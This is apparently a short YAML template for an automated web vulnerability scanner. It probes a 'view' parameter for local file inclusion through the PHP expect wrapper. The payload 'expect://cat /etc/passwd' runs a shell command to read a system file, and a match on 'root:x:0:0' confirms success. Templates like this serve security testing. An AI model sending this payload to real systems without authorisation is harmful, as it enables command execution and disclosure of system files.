id: lfi5-006
name: 'Wrapper expect via view'
severity: high
type: active
tags:
  - lfi
  - traversal
  - wrapper
description: 'Reads file via expect wrapper'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      view:
        - 'expect://cat /etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
